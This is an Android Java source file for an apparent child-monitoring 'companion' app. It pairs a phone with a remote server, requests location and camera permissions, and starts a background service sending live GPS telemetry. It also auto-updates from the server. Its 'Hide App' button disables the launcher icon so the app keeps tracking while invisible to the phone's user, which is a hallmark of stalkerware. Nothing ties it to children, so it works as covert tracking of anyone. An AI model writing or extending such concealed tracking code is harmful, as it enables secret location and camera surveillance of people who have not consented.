package com.snapapp.companion;

import android.Manifest;
import android.content.*;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.*;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {
    private static final int PERM_REQUEST_CODE = 2001;

    private EditText etPairingCode, etServerUrl;
    private Button btnActivate, btnSyncNow, btnHideApp;
    private TextView tvStatus, tvChildName;
    private View cardUnpaired, cardPaired;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);

        etPairingCode = findViewById(R.id.etPairingCode);
        etServerUrl = findViewById(R.id.etServerUrl);
        btnActivate = findViewById(R.id.btnActivate);
        btnSyncNow = findViewById(R.id.btnSyncNow);
        btnHideApp = findViewById(R.id.btnHideApp);
        tvStatus = findViewById(R.id.tvStatus);
        tvChildName = findViewById(R.id.tvChildName);
        cardUnpaired = findViewById(R.id.cardUnpaired);
        cardPaired = findViewById(R.id.cardPaired);

        String savedServer = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        etServerUrl.setText(savedServer);

        checkExistingPairing();

        btnActivate.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                handleActivation();
            }
        });

        btnSyncNow.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startSyncService();
                Toast.makeText(MainActivity.this, "Live GPS telemetry sent!", Toast.LENGTH_SHORT).show();
            }
        });

        btnHideApp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startSyncService();
                PackageManager pm = getPackageManager();
                ComponentName cn = new ComponentName(MainActivity.this, MainActivity.class);
                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                Toast.makeText(MainActivity.this, "App icon is now hidden! Telemetry is active.", Toast.LENGTH_LONG).show();
                finish();
            }
        });

        // Check for lifetime auto-update on launch
        AutoUpdater.checkForUpdate(this, savedServer, false);
    }

    private void checkExistingPairing() {
        String deviceId = prefs.getString("device_id", null);
        String childName = prefs.getString("child_name", "Protected Child");

        if (deviceId != null) {
            cardUnpaired.setVisibility(View.GONE);
            cardPaired.setVisibility(View.VISIBLE);
            tvChildName.setText("Protected: " + childName);
            requestPermissionsAndStart();
        } else {
            cardUnpaired.setVisibility(View.VISIBLE);
            cardPaired.setVisibility(View.GONE);
        }
    }

    private void handleActivation() {
        final String code = etPairingCode.getText().toString().trim();
        final String server = etServerUrl.getText().toString().trim();

        if (code.length() < 4) {
            tvStatus.setText("Please enter valid pairing code");
            return;
        }

        tvStatus.setText("Connecting to server...");
        btnActivate.setEnabled(false);

        ApiClient.pairDevice(server, code, new ApiClient.ApiCallback() {
            @Override
            public void onSuccess(final JSONObject response) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        btnActivate.setEnabled(true);
                        String devId = response.optString("device_id", "");
                        String child = response.optString("child_name", "Kid Device");

                        prefs.edit()
                                .putString("device_id", devId)
                                .putString("child_name", child)
                                .putString("server_url", server)
                                .apply();

                        Toast.makeText(MainActivity.this, "Device Paired Successfully!", Toast.LENGTH_LONG).show();
                        checkExistingPairing();
                    }
                });
            }

            @Override
            public void onError(final String error) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        btnActivate.setEnabled(true);
                        tvStatus.setText("Error: " + error);
                    }
                });
            }
        });
    }

    private void requestPermissionsAndStart() {
        String[] perms = new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA
        };

        boolean allGranted = true;
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            startSyncService();
        } else {
            ActivityCompat.requestPermissions(this, perms, PERM_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERM_REQUEST_CODE) {
            startSyncService();
        }
    }

    private void startSyncService() {
        Intent serviceIntent = new Intent(this, CompanionSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}
